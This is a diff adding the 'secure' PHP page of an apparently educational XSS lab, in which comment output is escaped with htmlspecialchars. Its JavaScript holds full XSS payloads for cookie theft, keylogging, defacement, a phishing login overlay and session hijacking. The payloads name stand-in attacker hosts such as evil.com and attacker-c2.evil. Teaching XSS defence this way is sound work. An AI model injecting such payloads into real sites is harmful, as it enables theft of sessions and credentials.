@@ -1,0 +1,515 @@
+<?php
+// ============================================================
+// SECURE COMMENT SYSTEM — PROTECTED WORKSPACE
+// CS04 | Cyber Sanskar Internship | XSS Attack Simulation Lab
+// ============================================================
+session_start();
+
+if (!isset($_SESSION['secure_comments'])) {
+    $_SESSION['secure_comments'] = [];
+}
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['clear'])) {
+    $_SESSION['secure_comments'] = [];
+}
+
+// Store secure comment submission
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['name'], $_POST['comment']) && !isset($_POST['clear'])) {
+    // Basic trim for clean data (sanitization happens on output for demonstration)
+    $_SESSION['secure_comments'][] = [
+        'name'        => trim($_POST['name']),
+        'comment'     => trim($_POST['comment']),
+        'attack_type' => isset($_POST['attack_type']) ? $_POST['attack_type'] : 'Custom Payload',
+        'time'        => date('Y-m-d H:i:s'),
+    ];
+}
+
+$injection_count = count($_SESSION['secure_comments'] ?? []);
+
+// Provide attacks for JS (as a string or let JS handle it independently to match vulnerable.php)
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure | XSS Simulation Lab — CS04</title>
+    <!-- Use index.php's light theme -->
+    <link rel="stylesheet" href="style-light.css?v=4">
+    <!-- Load Feather Icons -->
+    <script src="https://unpkg.com/feather-icons"></script>
+    <style>
+        /* Adapt missing classes from style.css to light mode for Secure page */
+        .stats-row { display: grid; grid-template-columns: repeat(4, 1fr); gap: 1rem; margin-bottom: 2rem; }
+        .stat-box { background: rgba(16, 185, 129, 0.05); border: 1px solid rgba(16, 185, 129, 0.2); border-radius: 12px; padding: 1.2rem 1.2rem; text-align: center; }
+        .stat-value { font-size: 1.8rem; font-weight: 800; color: #059669; font-family: var(--font-mono); line-height: 1.2; }
+        .stat-label { font-size: 0.75rem; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 0.08em; margin-top: 0.2rem; font-weight: 600; }
+
+        .bento-inner { background: #ffffff; border: 1px solid rgba(0,0,0,0.08); border-radius: 16px; padding: 1.5rem; box-shadow: 0 4px 20px rgba(0,0,0,0.02); margin-bottom: 1.5rem; }
+
+        .arsenal-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 0.6rem; margin-bottom: 1.25rem; }
+        .attack-btn { background: #f8fafc; border: 1px solid rgba(0,0,0,0.06); border-radius: 10px; padding: 0.75rem 0.85rem; cursor: pointer; text-align: left; transition: all 0.2s; color: var(--text-primary); font-size: 0.85rem; display: flex; align-items: center; gap: 0.6rem; width: 100%; font-family: var(--font-body); }
+        .attack-btn:hover { border-color: rgba(16, 185, 129, 0.4); background: rgba(16, 185, 129, 0.03); transform: translateY(-1px); box-shadow: 0 2px 8px rgba(16, 185, 129, 0.05); }
+        .attack-btn.active { border-color: #10b981; background: rgba(16, 185, 129, 0.08); box-shadow: 0 0 0 2px rgba(16, 185, 129, 0.1); }
+        .attack-btn .btn-icon { font-size: 1.1rem; }
+        .attack-btn .btn-label { font-weight: 700; line-height: 1.2; color: #1e293b; }
+        .attack-btn .btn-sub { font-size: 0.7rem; color: #64748b; margin-top: 0.1rem; }
+
+        .attack-info-box { background: #f8fafc; border: 1px dashed rgba(16, 185, 129, 0.3); border-radius: 10px; padding: 1rem; min-height: 70px; }
+        .attack-info-box .info-title { color: #059669; font-size: 0.85rem; font-weight: 800; margin-bottom: 0.4rem; display: flex; align-items: center; gap: 0.4rem; font-family: var(--font-heading); }
+        .attack-info-box .info-desc { color: #475569; font-size: 0.85rem; line-height: 1.6; }
+
+        .attack-type-badge { display: inline-flex; align-items: center; gap: 0.3rem; font-size: 0.7rem; font-family: var(--font-mono); font-weight: 700; padding: 0.25rem 0.6rem; border-radius: 6px; text-transform: uppercase; letter-spacing: 0.05em; background: rgba(16, 185, 129, 0.1); color: #059669; border: 1px solid rgba(16, 185, 129, 0.2); }
+        
+        .risk-tag { display: inline-block; font-size: 0.65rem; padding: 0.15rem 0.5rem; border-radius: 4px; font-weight: 800; letter-spacing: 0.06em; text-transform: uppercase; font-family: var(--font-mono); }
+        .risk-secure { background: rgba(16, 185, 129, 0.1); color: #059669; border: 1px solid rgba(16, 185, 129, 0.3); }
+
+        .blinking-dot { display: inline-block; width: 8px; height: 8px; border-radius: 50%; background: #10b981; animation: blink 1.2s infinite; margin-right: 0.4rem; }
+        @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.3} }
+
+        .form-group { margin-bottom: 1.25rem; }
+        .form-group label { display: block; font-weight: 600; font-size: 0.9rem; color: #334155; margin-bottom: 0.4rem; }
+        .input-modern { width: 100%; padding: 0.75rem 1rem; border: 1px solid rgba(0,0,0,0.15); border-radius: 8px; background: #ffffff; color: #1e293b; font-family: var(--font-body); font-size: 0.95rem; transition: border-color 0.2s, box-shadow 0.2s; }
+        .input-modern:focus { outline: none; border-color: #10b981; box-shadow: 0 0 0 3px rgba(16, 185, 129, 0.15); }
+        
+        .btn-primary { background: #10b981; color: white; border: none; padding: 0.8rem 1.5rem; border-radius: 8px; font-weight: 700; font-family: var(--font-body); cursor: pointer; transition: background 0.2s, transform 0.2s; display: inline-flex; align-items: center; justify-content: center; gap: 0.5rem; }
+        .btn-primary:hover { background: #059669; transform: translateY(-1px); }
+
+        /* Comments Styling */
+        .comments-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 1.5rem; border-bottom: 1px solid rgba(0,0,0,0.05); padding-bottom: 1rem; }
+        .comments-list { display: flex; flex-direction: column; gap: 1rem; }
+        .comment-item { background: #ffffff; border: 1px solid rgba(0,0,0,0.08); border-radius: 12px; padding: 1.25rem; display: flex; gap: 1rem; box-shadow: 0 2px 8px rgba(0,0,0,0.02); }
+        .comment-item.sec-border { border-left: 4px solid #10b981; }
+        .comment-avatar { width: 42px; height: 42px; border-radius: 50%; background: linear-gradient(135deg, #10b981, #059669); flex-shrink: 0; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 1.1rem; color: white; }
+        .comment-content { flex-grow: 1; min-width: 0; }
+        .comment-meta { display: flex; align-items: center; gap: 0.75rem; margin-bottom: 0.5rem; flex-wrap: wrap; }
+        .comment-author { font-weight: 700; font-size: 1rem; color: #1e293b; }
+        .comment-time { font-size: 0.8rem; color: #64748b; margin-left: auto; font-family: var(--font-mono); }
+        
+        .comment-payload-box { font-family: var(--font-mono); font-size: 0.85rem; background: #f8fafc; border-left: 3px solid #10b981; border-radius: 0 6px 6px 0; padding: 0.8rem 1rem; margin-top: 0.6rem; word-break: break-all; color: #059669; line-height: 1.6; }
+
+        /* Pipeline */
+        .pipeline-container { background: #ffffff; border: 1px solid rgba(16, 185, 129, 0.2); box-shadow: 0 10px 30px rgba(16, 185, 129, 0.08); border-radius: 16px; padding: 2rem; margin-bottom: 3rem; }
+        .pipeline-header { margin-bottom: 1.5rem; }
+        .pipeline-steps { display: flex; align-items: center; justify-content: space-between; gap: 1rem; flex-wrap: wrap; }
+        .step-box { flex: 1; min-width: 220px; background: #f8fafc; border: 1px solid rgba(0,0,0,0.06); border-radius: 12px; padding: 1.25rem; display: flex; flex-direction: column; gap: 0.5rem; position: relative; overflow: hidden; }
+        .step-box::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 3px; }
+        .step-box.raw::before { background: #ef4444; }
+        .step-box.process::before { background: #3b82f6; }
+        .step-box.safe::before { background: #10b981; }
+        .step-label { font-size: 0.75rem; text-transform: uppercase; letter-spacing: 0.05em; font-weight: 800; }
+        .step-box.raw .step-label { color: #dc2626; }
+        .step-box.process .step-label { color: #2563eb; }
+        .step-box.safe .step-label { color: #059669; }
+        .code-preview { font-family: var(--font-mono); font-size: 0.85rem; color: #1e293b; word-break: break-all; background: #ffffff; padding: 0.5rem 0.75rem; border-radius: 6px; border: 1px solid rgba(0,0,0,0.05); box-shadow: 0 1px 3px rgba(0,0,0,0.05); }
+        .step-arrow { color: #94a3b8; }
+        
+        .main-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 2rem; align-items: start; margin-bottom: 4rem; }
+        
+        @media (max-width: 992px) {
+            .main-grid { grid-template-columns: 1fr; }
+            .stats-row { grid-template-columns: 1fr 1fr; }
+            .title-main { font-size: 2.5rem !important; }
+            header { padding: 2rem !important; }
+        }
+        @media (max-width: 600px) {
+            .stats-row { grid-template-columns: 1fr; }
+            .arsenal-grid { grid-template-columns: 1fr; }
+        }
+    </style>
+</head>
+<body>
+    <div class="mesh-bg"></div>
+
+    <div class="container">
+        <!-- Dashboard / Navigation consistent with index.php -->
+        <nav class="navbar" style="padding-top: 2rem;">
+            <div class="nav-brand" style="color: #10b981;"><span>SECURE</span> WORKSPACE</div>
+            <div class="nav-links">
+                <a href="index.php">Dashboard</a>
+                <a href="vulnerable.php" style="color: #ef4444;">Vulnerable Setup</a>
+            </div>
+        </nav>
+
+        <header style="margin-bottom: 3rem; text-align: left; background: #ffffff; border: 1px solid rgba(16, 185, 129, 0.2); padding: 3rem; border-radius: 20px; box-shadow: 0 10px 40px rgba(16, 185, 129, 0.05);">
+            <div style="display:inline-flex;align-items:center;justify-content:center;width:56px;height:56px;border-radius:14px;background:rgba(16, 185, 129, 0.1);border:1px solid rgba(16, 185, 129, 0.2);margin-bottom:1.5rem;color:#10b981;">
+                <i data-feather="shield"></i>
+            </div>
+            <h1 class="title-main" style="font-size:3.5rem; margin-bottom: 0.5rem; background: linear-gradient(to right, #10b981, #059669); -webkit-background-clip: text; color: transparent; text-transform: none; letter-spacing: -1px;">Secure Execution Lab</h1>
+            <p class="subtitle" style="font-size:1.15rem; max-width: none; color: #64748b; margin-bottom: 0;">
+                <span class="blinking-dot"></span>
+                Protected environment using output sanitization. Injections are safely encoded and rendered harmless via strictly enforced PHP filtering rules.
+            </p>
+        </header>
+
+        <!-- Educational Pipeline Visualization -->
+        <div class="pipeline-container">
+            <div class="pipeline-header">
+                <h2 style="font-family: var(--font-heading); font-size: 1.5rem; font-weight: 800; display: flex; align-items: center; gap: 0.5rem; color: #10b981;">
+                     <i data-feather="check-square" style="color: #10b981;"></i> Sanitization Pipeline
+                </h2>
+                <p style="font-size: 1rem; color: #64748b; margin-top: 0.5rem;">Observe how the <code>htmlspecialchars()</code> function completely neutralizes payloads.</p>
+            </div>
+            <div class="pipeline-steps">
+                <div class="step-box raw">
+                    <span class="step-label">1. Raw Input</span>
+                    <code class="code-preview">&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
+                </div>
+                <div class="step-arrow">
+                    <i data-feather="arrow-right"></i>
+                </div>
+                <div class="step-box process">
+                    <span class="step-label">2. Processing (PHP)</span>
+                    <code class="code-preview">htmlspecialchars($input, ENT_QUOTES, 'UTF-8')</code>
+                </div>
+                <div class="step-arrow">
+                    <i data-feather="arrow-right"></i>
+                </div>
+                <div class="step-box safe">
+                    <span class="step-label">3. Safe Encoded Output</span>
+                    <code class="code-preview">&amp;lt;script&amp;gt;alert(&amp;apos;XSS&amp;apos;)&amp;lt;/script&amp;gt;</code>
+                </div>
+            </div>
+        </div>
+
+        <!-- Stats Row -->
+        <div class="stats-row">
+            <div class="stat-box">
+                <div class="stat-value"><?php echo $injection_count; ?></div>
+                <div class="stat-label">Injections Blocked</div>
+            </div>
+            <div class="stat-box">
+                <div class="stat-value" style="color: #10b981;">0</div>
+                <div class="stat-label">Successful Attacks</div>
+            </div>
+            <div class="stat-box">
+                <div class="stat-value" style="color: #059669; font-size: 1.4rem; padding-top: 0.3rem;">SECURE</div>
+                <div class="stat-label">System Status</div>
+            </div>
+            <div class="stat-box">
+                <div class="stat-value" style="font-size:1.4rem;padding-top:0.3rem;color:#1e293b;">0.0</div>
+                <div class="stat-label">CVSS Score</div>
+            </div>
+        </div>
+
+        <!-- Interactive Playground -->
+        <div class="main-grid">
+
+            <!-- LEFT COLUMN: Arsenal + Form -->
+            <div style="display:flex;flex-direction:column;gap:1.5rem;">
+
+                <!-- Attack Arsenal -->
+                <div class="bento-inner">
+                    <div style="display:flex;align-items:center;gap:0.75rem;margin-bottom:1.5rem;">
+                        <i data-feather="cpu" style="color:#10b981;"></i>
+                        <h2 style="font-family: var(--font-heading); font-size:1.25rem;font-weight:800;color:#1e293b;">Payload Simulator</h2>
+                        <span class="risk-tag risk-secure" style="margin-left:auto;">Safety On</span>
+                    </div>
+
+                    <div class="arsenal-grid">
+                        <button type="button" class="attack-btn" onclick="selectAttack('cookie')" id="btn-cookie">
+                            <span class="btn-icon">🍪</span>
+                            <div>
+                                <div class="btn-label">Cookie Harvester</div>
+                                <div class="btn-sub">Session theft scenario</div>
+                            </div>
+                        </button>
+                        <button type="button" class="attack-btn" onclick="selectAttack('keylogger')" id="btn-keylogger">
+                            <span class="btn-icon">⌨️</span>
+                            <div>
+                                <div class="btn-label">Keylogger</div>
+                                <div class="btn-sub">Keystroke capture</div>
+                            </div>
+                        </button>
+                        <button type="button" class="attack-btn" onclick="selectAttack('defacement')" id="btn-defacement">
+                            <span class="btn-icon">💀</span>
+                            <div>
+                                <div class="btn-label">Page Defacement</div>
+                                <div class="btn-sub">DOM takeover attempt</div>
+                            </div>
+                        </button>
+                        <button type="button" class="attack-btn" onclick="selectAttack('phishing')" id="btn-phishing">
+                            <span class="btn-icon">🎣</span>
+                            <div>
+                                <div class="btn-label">Phishing Overlay</div>
+                                <div class="btn-sub">Credential harvest</div>
+                            </div>
+                        </button>
+                        <button type="button" class="attack-btn" onclick="selectAttack('session')" id="btn-session">
+                            <span class="btn-icon">🔓</span>
+                            <div>
+                                <div class="btn-label">Session Hijacker</div>
+                                <div class="btn-sub">Auth bypass test</div>
+                            </div>
+                        </button>
+                        <button type="button" class="attack-btn" onclick="selectAttack('dom')" id="btn-dom">
+                            <span class="btn-icon">🔀</span>
+                            <div>
+                                <div class="btn-label">DOM Manipulation</div>
+                                <div class="btn-sub">Content injection</div>
+                            </div>
+                        </button>
+                        <button type="button" class="attack-btn" onclick="selectAttack('fingerprint')" id="btn-fingerprint">
+                            <span class="btn-icon">🎯</span>
+                            <div>
+                                <div class="btn-label">Browser Fingerprint</div>
+                                <div class="btn-sub">Reconnaissance bot</div>
+                            </div>
+                        </button>
+                        <button type="button" class="attack-btn" onclick="selectAttack('custom')" id="btn-custom">
+                            <span class="btn-icon">✏️</span>
+                            <div>
+                                <div class="btn-label">Custom Payload</div>
+                                <div class="btn-sub">Manual injection</div>
+                            </div>
+                        </button>
+                    </div>
+
+                    <!-- Attack Info Panel -->
+                    <div class="attack-info-box" id="attack-info">
+                        <div class="info-title"><i data-feather="info" style="width:16px;height:16px;"></i> Select an attack vector above</div>
+                        <div class="info-desc">Click any attack type to auto-fill its payload and description into the injection form below.</div>
+                        <div id="mitigation-info" style="display:none; margin-top:0.75rem; padding-top:0.75rem; border-top:1px dashed rgba(16, 185, 129, 0.3); font-size:0.8rem; color:#059669;">
+                            <strong>Mitigation:</strong> <span id="mitigation-text"></span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Injection Form -->
+                <div class="bento-inner">
+                    <div style="display:flex;align-items:center;gap:0.75rem;margin-bottom:1.5rem;">
+                        <i data-feather="terminal" style="color:#64748b;"></i>
+                        <h2 style="font-family: var(--font-heading); font-size:1.25rem;font-weight:800;color:#1e293b;">Injection Console</h2>
+                        <span id="active-attack-badge" style="display:none;margin-left:auto;" class="attack-type-badge"></span>
+                    </div>
+
+                    <form method="POST" id="inject-form">
+                        <input type="hidden" name="attack_type" id="attack_type_input" value="Custom Payload">
+
+                        <div class="form-group">
+                            <label for="name">Identifier</label>
+                            <input type="text" id="name" name="name" class="input-modern"
+                                placeholder="e.g. Defender_0x7f" required>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="comment" style="display:flex;align-items:center;justify-content:space-between;">
+                                <span>XSS Payload</span>
+                                <span style="font-size:0.75rem;color:#10b981;font-family:var(--font-mono);font-weight:700;">✓ Sanitized before output</span>
+                            </label>
+                            <textarea id="comment" name="comment" class="input-modern"
+                                placeholder="Write your own XSS payload here..."
+                                required style="font-family:var(--font-mono);font-size:0.85rem;min-height:140px;"></textarea>
+                        </div>
+
+                        <button type="submit" class="btn-primary" style="width:100%;">
+                            <i data-feather="shield" style="width: 18px;"></i>
+                            Secure Verify
+                        </button>
+                    </form>
+                </div>
+            </div>
+
+            <!-- RIGHT COLUMN: Secure Feed -->
+            <div class="bento-inner" style="height: 100%;">
+                <div class="comments-header">
+                    <h2 class="comments-title" style="display:flex;align-items:center;gap:0.6rem;font-family:var(--font-heading);font-weight:800;color:#1e293b;">
+                        <span class="blinking-dot"></span>
+                        <i data-feather="activity" style="width:20px;color:#64748b;"></i>
+                        Execution Feed
+                    </h2>
+                    <form method="POST" style="margin:0;">
+                        <input type="hidden" name="clear" value="1">
+                        <button type="submit" style="background:none;border:1px solid rgba(0,0,0,0.1);border-radius:6px;padding:0.4rem 0.8rem;font-size:0.8rem;color:#64748b;cursor:pointer;display:flex;align-items:center;gap:0.4rem;font-weight:600;font-family:var(--font-body);transition:all 0.2s;">
+                            <i data-feather="trash-2" style="width:14px;height:14px;"></i> Clear Data
+                        </button>
+                    </form>
+                </div>
+
+                <div style="margin-bottom:1.5rem;padding:0.8rem 1rem;background:rgba(16, 185, 129, 0.08);border:1px dashed rgba(16, 185, 129, 0.4);border-radius:8px;font-size:0.85rem;color:#059669;font-family:var(--font-mono);">
+                    ✓ UI rendering completely safe. All content filtered with <strong>htmlspecialchars()</strong> framework APIs.
+                </div>
+
+                <!-- SECURE_INJECT -->
+                <?php if (empty($_SESSION['secure_comments'])): ?>
+                    <div style="text-align:center;padding:4rem 0;color:var(--text-secondary);">
+                        <i data-feather="shield-main" style="width:48px;height:48px;opacity:0.2;margin-bottom:1rem;color:#10b981;"></i>
+                        <p style="font-size:1rem;font-weight:500;">System pristine.<br>Submit a payload to witness sanitization.</p>
+                    </div>
+                <?php else: ?>
+                    <div class="comments-list">
+                        <?php
+                        $badge_map = [
+                            'Cookie Harvester'       => ['#10b981', '🍪'],
+                            'Keylogger'              => ['#10b981', '⌨️'],
+                            'Page Defacement'        => ['#10b981', '💀'],
+                            'Phishing Overlay'       => ['#10b981', '🎣'],
+                            'Session Hijacker'       => ['#10b981', '🔓'],
+                            'DOM Manipulation'       => ['#10b981', '🔀'],
+                            'Browser Fingerprinting' => ['#10b981', '🎯'],
+                            'Custom Payload'         => ['#10b981', '✏️'],
+                        ];
+                        foreach (array_reverse($_SESSION['secure_comments']) as $c):
+                            $at = isset($c['attack_type']) ? $c['attack_type'] : 'Custom Payload';
+                            $clr = isset($badge_map[$at]) ? $badge_map[$at][0] : '#10b981';
+                            $ico = isset($badge_map[$at]) ? $badge_map[$at][1] : '⚡';
+                            $avatar = $c['name'] ? strtoupper(substr($c['name'], 0, 1)) : '?';
+                        ?>
+                        <div class="comment-item sec-border">
+                            <div class="comment-avatar">
+                                <?php echo htmlspecialchars($avatar, ENT_QUOTES, 'UTF-8'); ?>
+                            </div>
+                            <div class="comment-content">
+                                <div class="comment-meta">
+                                    <!-- SECURE: Outputting escaped input reliably via htmlspecialchars -->
+                                    <span class="comment-author"><?php echo htmlspecialchars($c['name'], ENT_QUOTES, 'UTF-8'); ?></span>
+                                    <span class="attack-type-badge">
+                                        <?php echo $ico . ' ' . htmlspecialchars($at, ENT_QUOTES, 'UTF-8'); ?>
+                                    </span>
+                                    <span class="comment-time"><?php echo htmlspecialchars($c['time'], ENT_QUOTES, 'UTF-8'); ?></span>
+                                </div>
+                                <div class="comment-payload-box">
+                                    <!-- SECURE: Outputting escaped input securely via htmlspecialchars -->
+                                    <?php echo nl2br(htmlspecialchars($c['comment'], ENT_QUOTES, 'UTF-8')); ?>
+                                </div>
+                            </div>
+                        </div>
+                        <?php endforeach; ?>
+                    </div>
+                <?php endif; ?>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <div class="footer-content" style="max-width: 1200px; margin: 0 auto; display: flex; flex-direction: column; align-items: center; gap: 1rem;">
+            <div style="display: flex; align-items: center; justify-content: center; gap: 0.5rem; margin-bottom: 0.5rem; color: #1e293b;">
+                <i data-feather="shield-check" style="width: 20px; height: 20px; color: #10b981;"></i>
+                <span style="font-weight: 800; font-family: var(--font-heading); letter-spacing: 1px;">XSS LAB</span>
+            </div>
+            <p style="max-width: 400px; margin: 0 auto; color: #64748b; font-size: 0.95rem; text-align: center;">
+                An educational project for understanding and mitigating web vulnerabilities.
+            </p>
+            <div style="display: flex; gap: 1.5rem; margin-top: 0.5rem;">
+                <a href="index.php" style="color: #64748b; text-decoration: none; font-weight: 600;">Home</a>
+                <a href="vulnerable.php" style="color: #64748b; text-decoration: none; font-weight: 600;">Vulnerable</a>
+                <a href="secure.php" style="color: #10b981; text-decoration: none; font-weight: 600;">Secure</a>
+            </div>
+        </div>
+    </footer>
+
+    <!-- RESTORED JAVASCRIPT FOR UI INTERACTION -->
+    <script>
+    feather.replace();
+
+    const ATTACKS = {
+      cookie: {
+        label: 'Cookie Harvester',
+        icon: '🍪', color: '#10b981', risk: 'NEUTRALIZED',
+        desc: 'Reads document.cookie and simulates exfiltration.',
+        mitigation: 'htmlspecialchars() converts quotes and brackets into HTML entities, preventing the browser from parsing document.cookie access and malicious iframe injection.',
+        name: 'CookieThief_0x1',
+        payload: `<script>!function(){var c=document.cookie||'No cookies set';var d=document.createElement('div');d.style.cssText='position:fixed;top:0;left:0;right:0;background:#1a0208;border-bottom:3px solid #ef4444;color:#fff;padding:1rem 2rem;z-index:99999;font-family:monospace;font-size:12px;box-shadow:0 4px 30px rgba(239,68,68,0.4)';d.innerHTML='<div style="color:#ef4444;font-weight:900;margin-bottom:0.4rem;font-size:1rem">🍪 COOKIE HARVESTER — DATA EXFILTRATED</div><div style="color:#fca5a5">Stolen: <b>'+c+'</b></div><div style="color:#666;font-size:10px;margin-top:0.3rem">→ GET http://attacker-c2.evil/collect?data='+encodeURIComponent(c)+'</div><button onclick="this.parentElement.remove()" style="position:absolute;top:0.75rem;right:1rem;background:none;border:none;color:#888;cursor:pointer;font-size:1rem">✕</button>';d.style.position='fixed';document.body.appendChild(d)}()<\/script>`
+      },
+      keylogger: {
+        label: 'Keylogger',
+        icon: '⌨️', color: '#10b981', risk: 'NEUTRALIZED',
+        desc: 'Attaches a keydown event listener.',
+        mitigation: 'Event listeners via JavaScript are stripped of their executable context. The &lt;script&gt; tags are rendered inert.',
+        name: 'KeySniffer_0x2',
+        payload: `<script>!function(){var log=[];document.addEventListener('keydown',function(e){if(e.key.length===1||e.key==='Enter'||e.key==='Backspace'){log.push(e.key==='Enter'?'↵':e.key==='Backspace'?'⌫':e.key);var d=document.getElementById('__kl');if(!d){d=document.createElement('div');d.id='__kl';d.style.cssText='position:fixed;bottom:0;left:0;right:0;background:#0f172a;border-top:3px solid #f59e0b;color:#fff;padding:0.75rem 2rem;z-index:99999;font-family:monospace;font-size:12px;display:flex;align-items:center;gap:1rem';document.body.appendChild(d)}d.innerHTML='<span style="color:#f59e0b;font-weight:900">⌨️ KEYLOGGER</span><span style="color:#fde68a;flex:1;word-break:break-all">'+log.join(' ')+'</span><span style="color:#666;font-size:10px">'+log.length+' keys → http://evil.com/keys</span>'}});alert('⌨️ Keylogger Injected!\\n\\nAll keystrokes captured live.\\nType anything on this page to see it work.')}()<\/script>`
+      },
+      defacement: {
+        label: 'Page Defacement',
+        icon: '💀', color: '#10b981', risk: 'NEUTRALIZED',
+        desc: 'Attempts to replace the entire page DOM.',
+        mitigation: 'By encoding &lt; and &gt;, the structural HTML injection is destroyed. The browser treats the defacement code as plain text instead of DOM elements.',
+        name: 'Defacer_0x3',
+        payload: `<script>!function(){var c=document.querySelector('.container');c.style.transition='opacity 0.5s';c.style.opacity='0';setTimeout(function(){c.innerHTML='<div style="text-align:center;padding:4rem 2rem"><div style="font-size:5rem;margin-bottom:1rem;animation:pulse 1s infinite">💀</div><h1 style="font-size:3rem;color:#ef4444;letter-spacing:4px;font-weight:900;text-transform:uppercase">Site Defaced</h1><p style="color:#fca5a5;font-size:1.1rem;margin:1rem 0">This server was compromised via Stored XSS</p><p style="color:#6b7280;font-size:0.9rem">All data exfiltrated — Contact: anon@proton.me</p><div style="margin:2rem auto;max-width:400px;padding:1rem;background:rgba(239,68,68,0.08);border:1px solid rgba(239,68,68,0.25);border-radius:8px;font-family:monospace;color:#f87171;font-size:0.82rem">Vuln: Stored XSS | CVSS: 9.8 CRITICAL</div><button onclick="location.reload()" style="padding:0.75rem 2rem;background:#fff;color:#000;border:none;border-radius:8px;cursor:pointer;font-weight:700">↩ Reload Page</button></div>';c.style.opacity='1';},500)}()<\/script>`
+      },
+      phishing: {
+        label: 'Phishing Overlay',
+        icon: '🎣', color: '#10b981', risk: 'NEUTRALIZED',
+        desc: 'Injects a full-screen fake login form.',
+        mitigation: 'The injected login form cannot render because HTML tags are safely encoded into displayable strings. Credential harvesting fails.',
+        name: 'PhishKit_0x4',
+        payload: `<script>!function(){document.body.insertAdjacentHTML('beforeend','<div id="__phish" style="position:fixed;inset:0;background:rgba(0,0,0,0.92);z-index:99999;display:flex;align-items:center;justify-content:center;backdrop-filter:blur(4px)"><div style="background:#fff;border-radius:14px;padding:2.5rem;max-width:380px;width:90%;text-align:center;box-shadow:0 25px 60px rgba(0,0,0,0.5)"><div style="font-size:2.5rem;margin-bottom:0.75rem">🔐</div><h2 style="color:#1f2937;font-size:1.25rem;margin-bottom:0.25rem">Session Expired</h2><p style="color:#9ca3af;font-size:0.82rem;margin-bottom:1.5rem">Re-enter your credentials to continue</p><input id="__pe" type="email" placeholder="Email address" style="width:100%;padding:0.8rem;border:1px solid #e5e7eb;border-radius:6px;margin-bottom:0.75rem;font-size:0.95rem;box-sizing:border-box;outline:none"><input id="__pp" type="password" placeholder="Password" style="width:100%;padding:0.8rem;border:1px solid #e5e7eb;border-radius:6px;margin-bottom:1.25rem;font-size:0.95rem;box-sizing:border-box;outline:none"><button onclick="alert(\\'🎣 Credentials Harvested!\\n\\nEmail: \\'+document.getElementById(\\'__pe\\').value+\\'\\nPassword: \\'+document.getElementById(\\'__pp\\').value+\\'\\n\\n→ Sent to: http://evil.com/harvest\\');document.getElementById(\\'__phish\\').remove()" style="width:100%;padding:0.9rem;background:#1d4ed8;color:#fff;border:none;border-radius:6px;font-size:1rem;cursor:pointer;font-weight:600">Sign In</button><p style="margin-top:1rem;font-size:0.75rem;color:#9ca3af;cursor:pointer" onclick="document.getElementById(\\'__phish\\').remove()">[Dismiss overlay]</p></div></div>');alert('🎣 Phishing Overlay Deployed!\\n\\nA fake login form now covers the page.\\nVictim credentials will be captured on submit.')}()<\/script>`
+      },
+      session: {
+        label: 'Session Hijacker',
+        icon: '🔓', color: '#10b981', risk: 'NEUTRALIZED',
+        desc: 'Attempts to read session cookies.',
+        mitigation: 'The XMLHttpRequest code is rendered as text. The browser ignores the payload, leaving session credentials secure.',
+        name: 'SessionGrabber_0x5',
+        payload: `<script>!function(){var sid=Math.random().toString(36).substr(2,18).toUpperCase();document.cookie='PHPSESSID=HIJACKED_'+sid+'; path=/';var info={cookies:document.cookie,fake_sid:'HIJACKED_'+sid,ua:navigator.userAgent.substr(0,60),origin:location.origin};var d=document.createElement('div');d.style.cssText='position:fixed;top:20px;right:20px;z-index:99999;background:#0d1117;border:2px solid #8b5cf6;border-radius:12px;padding:1.25rem 1.5rem;font-family:monospace;font-size:11px;color:#fff;max-width:380px;box-shadow:0 8px 30px rgba(139,92,246,0.3)';d.innerHTML='<div style="color:#8b5cf6;font-weight:900;font-size:0.95rem;margin-bottom:0.75rem">🔓 SESSION HIJACKED</div><div style="line-height:1.8"><div><span style="color:#6b7280">Cookies: </span><span style="color:#c4b5fd">'+document.cookie.substr(0,55)+'...</span></div><div><span style="color:#6b7280">Fake SID: </span><span style="color:#c4b5fd">HIJACKED_'+sid+'</span></div><div><span style="color:#6b7280">C2: </span><span style="color:#c4b5fd">http://attacker.com/s?id='+sid+'</span></div></div><div style="margin-top:0.75rem;color:#4b5563;font-size:10px">Attacker now authenticated as victim</div><button onclick="this.parentElement.remove()" style="position:absolute;top:0.6rem;right:0.75rem;background:none;border:none;color:#555;cursor:pointer">✕</button>';document.body.appendChild(d)}()<\/script>`
+      },
+      dom: {
+        label: 'DOM Manipulation',
+        icon: '🔀', color: '#10b981', risk: 'NEUTRALIZED',
+        desc: 'Iterates over headings directly mapped to DOM manipulation.',
+        mitigation: 'CSS and element selectors injected via Javascript fail to execute because the script context is escaped safely.',
+        name: 'DOMHijacker_0x6',
+        payload: `<script>!function(){document.querySelectorAll('h1,h2').forEach(function(e){e.style.color='#ef4444';e.style.textShadow='0 0 20px rgba(239,68,68,0.5)'});document.querySelectorAll('.bento-card').forEach(function(c){c.style.borderColor='rgba(239,68,68,0.5)';c.style.boxShadow='0 0 25px rgba(239,68,68,0.12)'});var b=document.createElement('div');b.style.cssText='position:fixed;top:0;left:0;right:0;background:#7f1d1d;color:#fecaca;text-align:center;padding:0.55rem 1rem;font-family:monospace;font-size:0.8rem;font-weight:700;z-index:99999;letter-spacing:0.04em';b.innerHTML='⚠ DOM COMPROMISED — ALL ELEMENTS UNDER ATTACKER CONTROL — XSS PAYLOAD EXECUTING';document.body.prepend(b);alert('🔀 DOM Manipulation Complete!\\n\\nAll headings recolored.\\nAll cards highlighted.\\nAttacker banner injected at top of page.')}()<\/script>`
+      },
+      fingerprint: {
+        label: 'Browser Fingerprinting',
+        icon: '🎯', color: '#10b981', risk: 'NEUTRALIZED',
+        desc: 'Collects hardware and environment data.',
+        mitigation: 'System reconnaissance scripts are neutralized. The payload exists safely as text data rather than executing against navigator APIs.',
+        name: 'FingerprintBot_0x7',
